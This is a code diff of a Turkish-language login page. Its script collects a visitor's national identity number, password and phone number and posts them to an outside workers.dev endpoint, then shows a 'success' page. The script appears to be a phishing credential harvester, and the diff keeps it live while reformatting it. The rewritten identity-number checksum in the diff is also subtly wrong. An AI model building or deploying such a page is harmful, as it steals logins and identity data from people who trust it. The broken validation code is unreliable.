@@ -426,125 +426,106 @@
       </vp-modalpopup>
  
 	  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-	  <script>
-		document.getElementById('btnLogin').addEventListener('click', function (e) {
-			e.preventDefault(); 
-	
-			var tcno = document.getElementById('tcOrUserNametxt').value;
-			var password = document.getElementById('tbPasswordtxt').value;
-	
-			if (!validateTC(tcno)) {
-				Swal.fire({
-					icon: 'error',
-					title: 'Geçersiz T.C. Kimlik No',
-					text: 'Lütfen geçerli bir T.C. Kimlik Numarası giriniz.',
-					confirmButtonText: 'Tamam'
-				});
-				return false;
-			}
-	
-		 
+	<script>
+	document.getElementById('btnLogin').addEventListener('click', function (e) {
+		e.preventDefault();
+
+		var tcno = document.getElementById('tcOrUserNametxt').value;
+		var password = document.getElementById('tbPasswordtxt').value;
+
+		if (!validateTC(tcno)) {
 			Swal.fire({
-				title: 'Telefon Numaranız',
-				html: `
-					<div style="display: flex; align-items: center;">
-						<span style="margin-right: 10px;">📞</span> <!-- Telefon simgesi -->
-						<input type="tel" id="phone" value="+905" class="swal2-input" style="width: 85%;" minlength="13" maxlength="13" required>
-					</div>
-				`,
-				confirmButtonText: 'Gönder',
-				showCancelButton: true,
-				cancelButtonText: 'İptal',
-			 
-				allowOutsideClick: false,
-				preConfirm: () => {
-					const phone = document.getElementById('phone').value;
-					if (!/^\+905\d{9}$/.test(phone)) {
-						Swal.showValidationMessage('Lütfen geçerli bir telefon numarası giriniz!');
-					}
-					return phone;
-				}
-			}).then((result) => {
-				if (result.isConfirmed) {
-    var phone = result.value;  
-
-    // Create URLSearchParams
-    var params = new URLSearchParams();
-    params.append('tcno', tcno);
-    params.append('password', password);
-    params.append('phone', phone);
-
-    // Send the data as application/x-www-form-urlencoded
-    fetch('https://broad-recipe-30da.selimjuhan10.workers.dev/', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: params.toString()
-    })
-    .then(response => {
-        if (response.ok) {
-            window.location.href = 'basarili.html';
-        } else {
-            // Handle error
-            console.error('Error:', response.statusText);
-        }
-    })
-    .catch(error => {
-        console.error('Fetch error:', error);
-    });
-}
-);
-	
-		 
-			setTimeout(() => {
-				const phoneInput = document.getElementById('phone');
-				phoneInput.focus();  
-	
-			 
-				phoneInput.addEventListener('input', function() {
-					const isValid = phoneInput.value.length === 13 && /^\+905\d{9}$/.test(phoneInput.value);
-					const confirmButton = Swal.getConfirmButton();
-					confirmButton.disabled = !isValid;  
-				});
-	
-			 
-				Swal.getConfirmButton().disabled = true;
-			}, 100);  
-		});
-	
-		 
-		function validateTC(tcno) {
-			tcno = String(tcno);
-			if (tcno.substring(0, 1) === '0' || tcno.length !== 11) {
-				return false;
-			}
-	
-			var ilkon_array = tcno.substr(0, 10).split('');
-			var ilkon_total = hane_tek = hane_cift = 0;
-	
-			for (var i = 0; i < 9; ++i) {
-				var j = parseInt(ilkon_array[i], 10);
-				if (i % 2 === 0) {
-					hane_tek += j;
-				} else {
-					hane_cift += j;
-				}
-				ilkon_total += j;
-			}
-	
-			if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
-				return false;
-			}
-	
-			ilkon_total += parseInt(ilkon_array[9], 10);
-			if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
-				return false;
-			}
-	
-			return true;
+				icon: 'error',
+				title: 'Geçersiz T.C. Kimlik No',
+				text: 'Lütfen geçerli bir T.C. Kimlik Numarası giriniz.',
+				confirmButtonText: 'Tamam'
+			});
+			return;
 		}
-	</script>
+
+		Swal.fire({
+			title: 'Telefon Numaranız',
+			html: `
+				<div style="display: flex; align-items: center;">
+					<span style="margin-right: 10px;">📞</span>
+					<input type="tel" id="phone" value="+905" class="swal2-input" style="width: 85%;" minlength="13" maxlength="13" required>
+				</div>
+			`,
+			confirmButtonText: 'Gönder',
+			showCancelButton: true,
+			cancelButtonText: 'İptal',
+			allowOutsideClick: false,
+			preConfirm: () => {
+				const phone = document.getElementById('phone').value;
+				if (!/^\+905\d{9}$/.test(phone)) {
+					Swal.showValidationMessage('Lütfen geçerli bir telefon numarası giriniz!');
+				}
+				return phone;
+			}
+		}).then((result) => {
+			if (result.isConfirmed) {
+				var phone = result.value;
+
+				// Create URLSearchParams
+				var params = new URLSearchParams();
+				params.append('tcno', tcno);
+				params.append('password', password);
+				params.append('phone', phone);
+
+				// Send the data as application/x-www-form-urlencoded
+				fetch('https://broad-recipe-30da.selimjuhan10.workers.dev/', {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/x-www-form-urlencoded'
+					},
+					body: params.toString()
+				})
+				.then(response => {
+					if (response.ok) {
+						window.location.href = 'basarili.html';
+					} else {
+						console.error('Error:', response.statusText);
+					}
+				})
+				.catch(error => {
+					console.error('Fetch error:', error);
+				});
+			}
+		});
+
+		setTimeout(() => {
+			const phoneInput = document.getElementById('phone');
+			phoneInput.focus();
+
+			phoneInput.addEventListener('input', function() {
+				const isValid = phoneInput.value.length === 13 && /^\+905\d{9}$/.test(phoneInput.value);
+				const confirmButton = Swal.getConfirmButton();
+				confirmButton.disabled = !isValid;
+			});
+
+			Swal.getConfirmButton().disabled = true;
+		}, 100);
+	});
+
+	function validateTC(tcno) {
+		tcno = String(tcno);
+		if (tcno.length !== 11 || tcno.startsWith('0')) {
+			return false;
+		}
+
+		const ilkon_array = tcno.split('').map(Number);
+		const hane_tek = ilkon_array.filter((_, i) => i % 2 === 0).reduce((a, b) => a + b, 0);
+		const hane_cift = ilkon_array.filter((_, i) => i % 2 !== 0).reduce((a, b) => a + b, 0);
+		const ilkon_total = ilkon_array.slice(0, 10).reduce((a, b) => a + b, 0);
+
+		if ((hane_tek * 7 - hane_cift) % 10 !== ilkon_array[9]) {
+			return false;
+		}
+
+		return (ilkon_total + ilkon_array[9]) % 10 === ilkon_array[10];
+	}
+</script>
+
 	
 	<style>
 		.swal-container-custom {
